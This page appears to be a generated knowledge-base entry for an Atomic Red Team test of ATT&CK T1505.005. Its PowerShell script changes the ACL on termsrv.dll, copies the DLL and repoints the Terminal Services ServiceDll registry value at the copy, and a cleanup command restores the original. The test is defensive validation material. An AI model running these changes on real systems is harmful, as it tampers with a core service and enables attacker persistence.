---
atomic_guid: "18136e38-0530-49b2-b309-eed173787471"
title: "Modify Terminal Services DLL Path"
framework: "atomic"
generated: "true"
attack_technique_id: "T1505.005"
attack_technique_name: "Server Software Component: Terminal Services DLL"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1505.005/T1505.005.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "18136e38-0530-49b2-b309-eed173787471"
  - "Modify Terminal Services DLL Path"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Modify Terminal Services DLL Path

This atomic test simulates the modification of the ServiceDll value in HKLM\System\CurrentControlSet\services\TermService\Parameters. This technique may be leveraged by adversaries to establish persistence by loading a patched version of the DLL containing malicious code.

## Metadata

- Atomic GUID: 18136e38-0530-49b2-b309-eed173787471
- Technique: T1505.005: Server Software Component: Terminal Services DLL
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1505.005/T1505.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1505-server_software_component|T1505.005]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$termsrvDll = "C:\Windows\System32\termsrv.dll"

$ACL = Get-Acl $termsrvDll
$permission = "Administrators","FullControl","Allow"
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$ACL.SetAccessRule($accessRule)
Set-Acl -Path $termsrvDll -AclObject $ACL

Copy-Item -Path $termsrvDll -Destination "$HOME\AtomicTest.dll"

$newServiceDll = "$HOME\AtomicTest.dll"

$registryPath = "HKLM:\System\CurrentControlSet\services\TermService\Parameters"

# Check if the registry key exists
if (Test-Path -Path $registryPath) {
    # Modify the ServiceDll value in the registry
    Set-ItemProperty -Path $registryPath -Name "ServiceDll" -Value $newServiceDll
    Write-Host "ServiceDll value in the registry has been updated to: $newServiceDll"
} else {
    Write-Host "Registry key not found. Make sure the 'TermService\Parameters' key exists."
}
```

### Cleanup

```powershell
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\TermService\Parameters" -Name "ServiceDll" -Value "C:\Windows\System32\termsrv.dll"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1505.005/T1505.005.yaml)
